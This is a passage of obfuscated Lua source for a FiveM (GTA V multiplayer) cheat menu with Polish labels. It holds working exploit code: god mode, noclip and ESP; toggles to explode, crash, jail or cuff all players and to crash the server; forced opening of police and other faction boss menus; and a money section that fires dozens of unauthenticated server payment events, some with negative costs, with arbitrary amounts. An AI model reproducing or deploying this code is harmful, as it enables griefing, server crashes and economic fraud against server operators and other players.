				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("<FONT COLOR='#e98d66'>∑<FONT COLOR='#595959'>Opcje Broni", "KUYKUYTUYTUKUYKUYTKU") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("<FONT COLOR='#06090d'>∑<FONT COLOR='#595959'>Opcje Rozwalania", "TRJYTJYTRHTTRHYTR") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("<FONT COLOR='#00ff09'>∑<FONT COLOR='#59ff5f'>Opcje Kasy", "RHRTHTRHTEYJJYET") then
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~[ KILL MENU ]") then
					BTBRTHJRJYHTJYRYTFY = false
				end
				
				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("RTJHJEYTYYTGTRYJTG") then

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("JJJJJJJJJJJJJJJJJJJJJJJJJJJJ") then
				if
					APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
						"~h~~g~God ~h~~r~Mode",
						htrhrhjhredthtyjry,
						function(HYTJTJTREJYRTYTJYUJUY)
							htrhrhjhredthtyjry = HYTJTJTREJYRTYTJYUJUY
						end
					)
				 then
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~s~Revive ~h~~g~ESX") then
					TriggerEvent("esx_ambulancejob:revive")
				    TriggerEvent('ambulancier:selfRespawn')
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~g~Heal") then
					SetEntityHealth(PlayerPedId(), 200)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~b~Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~w~~h~Set hunger to ~h~~g~100%") then
					TriggerEvent("esx_status:RTEHTRHTRHRHYR", "hunger", 1000000)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~w~~h~Set thirst to ~h~~g~100%") then
					TriggerEvent("esx_status:RTEHTRHTRHRHYR", "thirst", 1000000)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~b~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~b~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
				elseif
				APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ("~h~Infinite Stamina",btrhrtethrertyjytejyt,function(HYTJTJTREJYRTYTJYUJUY)btrhrtethrertyjytejyt = HYTJTJTREJYRTYTJYUJUY end)
				then
				elseif
				APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
					"~h~Super Jump",
					fregergsrsefhthtreh,
					function(HYTJTJTREJYRTYTJYUJUY)
					fregergsrsefhthtreh = HYTJTJTREJYRTYTJYUJUY
					end)
				then
				elseif
				APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
					"~h~Explosive Punch",
					vtrhrtestgrhtyjhty,
					function(HYTJTJTREJYRTYTJYUJUY)
					vtrhrtestgrhtyjhty = HYTJTJTREJYRTYTJYUJUY
					end)
				then
				elseif
				APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ("~h~Fast Run ~r~NEW",vfgrtgrtjrvvvfgtrhththth,function(HYTJTJTREJYRTYTJYUJUY)vfgrtgrtjrvvvfgtrhththth = HYTJTJTREJYRTYTJYUJUY end)
			 	then
				elseif
				APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
					"~h~Invisible",
					Invisible_tutajzmien,
					function(HYTJTJTREJYRTYTJYUJUY)
					Invisible_tutajzmien = HYTJTJTREJYRTYTJYUJUY
					end)
				then
				elseif
				APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ("~h~NoClip",htrjyjtyjuyuykyuk,function(HYTJTJTREJYRTYTJYUJUY)htrjyjtyjuyuykyuk = HYTJTJTREJYRTYTJYUJUY end)
				then	
				end

		APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("JYTJRTYJYTYTRYTR") then
				if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~b~Soon Bo Detectable") then
				print("XD")
			 end

		APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ") then
			if
				APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
				"~h~ESP",
				verhrtjytjtyfrjy,
				function(HYTJTJTREJYRTYTJYUJUY)
				verhrtjytjtyfrjy = HYTJTJTREJYRTYTJYUJUY
				end)
			then
			elseif
				APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
				"~h~Players Blips Map",
				rehrethrtjtjtyghdb,
				function(HYTJTJTREJYRTYTJYUJUY)
				rehrethrtjtjtyghdb = HYTJTJTREJYRTYTJYUJUY
				end)
			then
			end

		APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
		elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("TRJYTJYTRHTTRHYTR") then
		if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ('~h~~p~#~s~ Spawn Peds', 'SpawnPeds') then
		end
		if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~Give All Weapons ~s~~h~Players") then
					for RTHRTHHTYRYYJTRYJJY = 0, 128 do
						if RTHRTHHTYRYYJTRYJJY ~= PlayerId() and GetPlayerServerId(RTHRTHHTYRYYJTRYJJY) ~= 0 then
							for i = 1, #RHRTHJRTJRJKYTKTYU do
								GiveWeaponToPed(PlayerPedId(RTHRTHHTYRYYJTRYJJY), GetHashKey(RHRTHJRTJRJKYTKTYU[i]), 1000, false, false)
					end
				end
			end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~Remove All Weapons ~s~~h~Players") then
					for RTHRTHHTYRYYJTRYJJY = 0, 128 do
						if RTHRTHHTYRYYJTRYJJY ~= PlayerId() and GetPlayerServerId(RTHRTHHTYRYYJTRYJJY) ~= 0 then
							for i = 1, #RHRTHJRTJRJKYTKTYU do
							RemoveAllPedWeapons(PlayerPedId(RTHRTHHTYRYYJTRYJJY), true)
				end	
			end
		end
		
	elseif
		APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
		"~h~~r~Explode ~s~All Players",
		GSEEEEEEEEEEEEEEDF,
		function(HYTJTJTREJYRTYTJYUJUY)
		GSEEEEEEEEEEEEEEDF = HYTJTJTREJYRTYTJYUJUY
	end)
	then
	elseif
		APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
		"~h~~r~Crash ~s~All Players",
		htrhrthrtjry,
		function(HYTJTJTREJYRTYTJYUJUY)
		htrhrthrtjry = HYTJTJTREJYRTYTJYUJUY
		end)
	then
	elseif
		APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
		"~h~~r~Fuck ~s~Server economy ~g~ESX",
		YIKUYLYLILIULULU,
		function(HYTJTJTREJYRTYTJYUJUY)
		YIKUYLYLILIULULU = HYTJTJTREJYRTYTJYUJUY
		end)
	then
	elseif
		APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
		"~h~~r~Jail ~s~All Players",
		RTGHRHTTRJJRTYYTFY,
		function(HYTJTJTREJYRTYTJYUJUY)
		RTGHRHTTRJJRTYYTFY = HYTJTJTREJYRTYTJYUJUY
		end)
	then
	elseif
		APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
		"~h~~r~Cuff ~s~All Players",
		vtrhjyjytryjyytkt,
		function(HYTJTJTREJYRTYTJYUJUY)
		vtrhjyjytryjyytkt = HYTJTJTREJYRTYTJYUJUY
	   	end)
	then
	elseif
		APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
			"~h~~r~Crash ~s~Server",
			VTRHJTYJYJTYR,
			function(HYTJTJTREJYRTYTJYUJUY)
				VTRHJTYJYJTYR = HYTJTJTREJYRTYTJYUJUY
			end)
	then
	end

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("KUYKUYTUYTUKUYKUYTKU") then
				if APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("~h~Specific Weapon", "RTGRSTGRFRSTGTRGRTG") then
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~g~Give ~s~~h~All Weapons") then
					for i = 1, #RHRTHJRTJRJKYTKTYU do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(RHRTHJRTJRJKYTKTYU[i]), 1000, false, false)
					end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~Remove ~s~~h~All Weapons") then
					for i = 1, #RHRTHJRTJRJKYTKTYU do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~b~Give Ammo") then
					for i = 1, #RHRTHJRTJRJKYTKTYU do
						AddAmmoToPed(PlayerPedId(), GetHashKey(RHRTHJRTJRJKYTKTYU[i]), 200)
					end
				elseif
					APISHITACCCCCCCCCCCCC.GTRHRTHRTHRJYR(
						"~h~Weapon/Melee Damage",
						{"1x (Default)", "2x", "3x", "4x", "5x"},
						currentItemIndex,
						selectedItemIndex,
						function(HTRHJTRJHRTJRY, selectedIndex_SSIJCHUHJA)
							currentItemIndex = HTRHJTRJHRTJRY
							selectedItemIndex = selectedIndex_SSIJCHUHJA
							SetPlayerWeaponDamageModifier(PlayerId(), selectedItemIndex)
							SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedItemIndex)
						end
					)
			    then
				elseif
					APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
						"~h~Infinite Ammo",
						InfAmmo,
						function(HYTJTJTREJYRTYTJYUJUY)
							InfAmmo = HYTJTJTREJYRTYTJYUJUY
							SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
						end
					)
				 then
				 elseif
					 APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ("~h~Vehicle Gun",vrthrtjytytktkutkuyk,
				 	 function(HYTJTJTREJYRTYTJYUJUY)vrthrtjytytktkutkuyk = HYTJTJTREJYRTYTJYUJUY end) 
			 	then
			 	elseif
					 APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ("~h~Delete Gun",grehtrjtyjjytktuty,
				 	 function(HYTJTJTREJYRTYTJYUJUY)grehtrjtyjjytktuty = HYTJTJTREJYRTYTJYUJUY end) 
			 	then
				end

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("RTGRSTGRFRSTGTRGRTG") then
				for i = 1, #RHRTHJRTJRJKYTKTYU do
					if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ(RHRTHJRTJRJKYTKTYU[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(RHRTHJRTJRJKYTKTYU[i]), 1000, false, false)
					end
				end

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("GRGRTJHNTHJRHEHYT") then
				if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~g~Spawn Vehicle") then
					local GHTRTHTEHHTYYTJY = VTRHTHRTJYTJYTKJT("Enter Vehicle Spawn Name", "", 100)
					if GHTRTHTEHHTYYTJY and IsModelValid(GHTRTHTEHHTYYTJY) and IsModelAVehicle(GHTRTHTEHHTYYTJY) then
						RequestModel(GHTRTHTEHHTYYTJY)
						while not HasModelLoaded(GHTRTHTEHHTYYTJY) do
							Citizen.Wait(0)
						end

						local RETHHTRTERHTREGHTYGHYT = CreateVehicle(GetHashKey(GHTRTHTEHHTYYTJY), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

						SetPedIntoVehicle(PlayerPedId(), RETHHTRTERHTREGHTYGHYT, -1)
					else
						AleTenAPIACJESTCHUJOWYSKRTR("~r~~h~Model is not valid!")
					end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~Repair Vehicle") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~Max Tuning") then
					vterhthrthtrh(GetVehiclePedIsUsing(PlayerPedId())
)				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~Max mechanics ~r~new") then
					vrtehtjtykjutkmtyf(GetVehiclePedIsUsing(PlayerPedId()))
				elseif
					APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
					"~h~Rainbow Vehicle Colour",
					trhrthrtjytjytytut,
					function(HYTJTJTREJYRTYTJYUJUY)
					trhrthrtjytjytytut = HYTJTJTREJYRTYTJYUJUY
					end)
				then
			    elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~b~Change License Plate~r~ NEW") then
					local hjytejyjtjjukjut = GetPlayerPed(-1)
					local VRHBRTHTRHRTTRHTYR = GetVehiclePedIsIn(hjytejyjtjjukjut, true)
					local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Enter the plate license you want", "", 10)
					if VGERVECCCCCCCC then
						SetVehicleNumberPlateText(VRHBRTHTRHRTTRHTYR, VGERVECCCCCCCC)
					end
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~Delete Vehicle") then
					vrfehtrjyktykuykuyt(GetVehiclePedIsUsing(PlayerPedId()))
					AleTenAPIACJESTCHUJOWYSKRTR("Vehicle Deleted")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~Make Vehicle dirty") then
					greghrtgrhrthjrtj(GetVehiclePedIsUsing(PlayerPedId()))
					AleTenAPIACJESTCHUJOWYSKRTR("Vehicle is now dirty")
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~Make Vehicle clean") then
					Cleanergrehgrehe(GetVehiclePedIsUsing(PlayerPedId()))
					AleTenAPIACJESTCHUJOWYSKRTR("Vehicle is now clean")
				elseif
					APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
						"~h~No Fall",
						TYJJYJYTYTYJTRYT,
						function(HYTJTJTREJYRTYTJYUJUY)
							TYJJYJYTYTYJTRYT = HYTJTJTREJYRTYTJYUJUY

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), TYJJYJYTYTYJTRYT)
						end
					)
				 then
				elseif
					APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
					"~h~Vehicle Speedboost ~g~Num9",
						tgrhtjytjtyjty,
						function(HYTJTJTREJYRTYTJYUJUY)
						tgrhtjytjtyjty = HYTJTJTREJYRTYTJYUJUY
						end)
				then
				elseif
					APISHITACCCCCCCCCCCCC.VYEVHRHTRYJYTJ(
						"~h~Super Grip",
						ghtrwrhtrdtthdr,
						function(HYTJTJTREJYRTYTJYUJUY)
							ghtrwrhtrdtthdr = HYTJTJTREJYRTYTJYUJUY
						end
					)
				then
				end

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("RHRTHTRHTEYJJYET") then
				if APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("~s~Menu ~h~~r~RECRUIT PLAYERS", "TRHHTEJYTYT") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("~s~Menu ~b~~h~BOSS", "XZWDEFEWFEWFXWEFEA") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("~s~Menu ~g~~h~MONEY", "VHRTRTCRVHRTHVRTH") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("~s~Menu ~p~~h~DRUGS", "ESXDrugsHRAGRHRTHRTRT") then
				elseif APISHITACCCCCCCCCCCCC.VTRYTHYTHYTHJYTHYJRHET("~s~Menu ~o~~h~OTHERS", "VRHTRHRTHTJHTREJT") then
				end

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("XZWDEFEWFEWFXWEFEA") then
				if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~c~~h~Mafia~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
				elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~ESX ~y~Custom Boss Menu") then
					local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Enter Boss Menu Script Name", "", 10)
					if VGERVECCCCCCCC then
						TriggerEvent('esx_society:openBossMenu', VGERVECCCCCCCC, function(TRJYRJYUTK,RHRTHYYTRJYYTRJYT) RHRTHYYTRJYYTRJYT.XAZFDESFZEEA() end)
					XCRGTRTYJHRYJYT(CGHHVEHTHYJR, false)
					end
				end

				APISHITACCCCCCCCCCCCC.THRHTYHTYRJYTJ()
			elseif APISHITACCCCCCCCCCCCC.VTHGTRHRJUTJUTY("VHRTRTCRVHRTHVRTH") then
				if APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~h~~r~-»~r~~h~ BEST MONEY «-") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
				TriggerServerEvent('esx_truckerjob:pay', VGERVECCCCCCCC)
				TriggerServerEvent('vrp_slotmachine:server:2', VGERVECCCCCCCC)
				TriggerServerEvent("esx_pizza:pay", VGERVECCCCCCCC)
				TriggerServerEvent('esx_jobs:caution', 'give_back', VGERVECCCCCCCC)
				TriggerServerEvent('lscustoms:payGarage', VGERVECCCCCCCC)
				TriggerServerEvent('esx_tankerjob:pay', VGERVECCCCCCCC)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', VGERVECCCCCCCC)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', VGERVECCCCCCCC)
				TriggerServerEvent('gambling:spend', VGERVECCCCCCCC)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', VGERVECCCCCCCC)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', VGERVECCCCCCCC)
				TriggerServerEvent('AdminMenu:giveBank', VGERVECCCCCCCC)
				TriggerServerEvent('AdminMenu:giveCash', VGERVECCCCCCCC)
				TriggerServerEvent('esx_slotmachine:sv:2', VGERVECCCCCCCC)
				TriggerServerEvent('esx_truckerjob:pay', VGERVECCCCCCCC)
				TriggerServerEvent('esx_moneywash:deposit', VGERVECCCCCCCC)
				TriggerServerEvent('esx_moneywash:withdraw', VGERVECCCCCCCC)
				TriggerServerEvent('esx_moneywash:deposit', VGERVECCCCCCCC)
			    TriggerServerEvent('mission:completed', VGERVECCCCCCCC)
				TriggerServerEvent('truckerJob:success',VGERVECCCCCCCC)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, CAUTION ~s~1") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
				TriggerServerEvent("esx_jobs:caution", "give_back", VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, TRUCKER ~s~2") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
				TriggerServerEvent('esx_truckerjob:pay', VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, ADMIN BANK ~s~3") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
				TriggerServerEvent('AdminMenu:giveBank', VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, ADMIN ~s~4") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
				TriggerServerEvent('AdminMenu:giveCash', VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, GOPOSTAL ~s~5") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
					TriggerServerEvent("esx_gopostaljob:pay", VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, BANKSEC ~s~6") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
					TriggerServerEvent("esx_banksecurity:pay", VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, SLOT ~s~7") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
					TriggerServerEvent("esx_slotmachine:sv:2", VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, LSC ~s~8") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100)
				if VGERVECCCCCCCC then
					TriggerServerEvent("lscustoms:payGarage", {costs = -VGERVECCCCCCCC})
				end		
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, SLOT ~s~9") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100)
				if VGERVECCCCCCCC then
				TriggerServerEvent("vrp_slotmachine:server:2", VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, BRUDNA ~s~10") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, TRUCKERJOB ~s~11") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
					TriggerServerEvent('esx_truckerjob:pay', VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, DOSTAWA ~s~12") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
					TriggerServerEvent('delivery:success', VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, TAXI(WYBOR) ~s~13") then
				local VGERVECCCCCCCC = VTRHTHRTJYTJYTKJT("Wpisz kwote pieniedzy", "", 100000000)
				if VGERVECCCCCCCC then
					TriggerServerEvent ('taxi:success', VGERVECCCCCCCC)
				end
			elseif APISHITACCCCCCCCCCCCC.BTRNBYJYTRFYYRFHJ("~g~~h~MONEY, TAXI ~s~14") then
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
